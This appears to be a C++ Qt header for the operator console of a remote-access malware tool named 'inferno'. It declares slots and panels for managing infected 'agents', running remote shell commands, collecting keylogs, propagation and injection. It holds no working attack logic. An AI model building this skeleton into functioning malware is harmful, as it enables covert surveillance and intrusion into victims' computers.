#pragma once

#include <QMainWindow>
#include <QSplitter>
#include <QListWidget>
#include <QPushButton>
#include <QLabel>
#include <QTabWidget>
#include <QTimer>
#include <QMap>
#include <QSet>
#include "../../common/include/Packet.hpp" // For any socket layer if needed, server header includes it
#include "../network/server.hpp"

namespace inferno {

class TelemetryPanel;
class KeylogPanel;
class IntelligencePanel;
class PropagationPanel;
class InjectionPanel;

class MainWindow : public QMainWindow {
    Q_OBJECT

public:
    explicit MainWindow(Server* server, QWidget* parent = nullptr);
    ~MainWindow() override = default;

private slots:
    void onAgentConnected(const QString& ip, const QString& info);
    void onAgentDisconnected(const QString& ip);
    void onShellOutputReceived(const QString& ip, const QString& output);
    void onProcessListReceived(const QString& ip, const QString& output);
    void onKeylogReceived(const QString& ip, const QString& data);
    void onPropagationResult(const QString& ip, const QString& result);
    void onScanResult(const QString& ip, const QString& report);
    void onStatusMessage(const QString& message);
    
    // UI Interaction slots
    void showAgentContextMenu(const QPoint& pos);
    void executeShellCommand();
    void requestProcessList();
    
    // Animation slots
    void toggleScan();
    void updateRadarAnimation();
    void toggleKeylogState(bool active);
    void pollKeylogger();

    // Custom slots for Panel connections
    void handleForceScan(const QString& uuid);
    void handleAgentSelectionChanged();
    void handleIntelligenceUpdated(const QString& uuid);

private:
    void setupUI();
    void loadStyleSheet();
    QString getSelectedAgentIp() const;

    Server* m_server;

    // UI Components
    QTabWidget*         m_tabWidget;
    QListWidget*        m_agentList;
    QLabel*             m_statusLabel;
    
    TelemetryPanel*     m_telemetryPanel;
    KeylogPanel*        m_keylogPanel;
    IntelligencePanel*  m_intelligencePanel;
    PropagationPanel*   m_propagationPanel;
    InjectionPanel*     m_injectionPanel;

    // Mapping Buffer
    QMap<QString, QString> m_agentIpToUuid; // Maps IP to persistent UUID
    
    // Animation State
    QPushButton*    m_btnScan;
    QTimer*         m_radarTimer;
    QTimer*         m_keylogPollTimer;
    int             m_radarAngle;
    QSet<QString>   m_activeKeylogIps;
};

} // namespace inferno
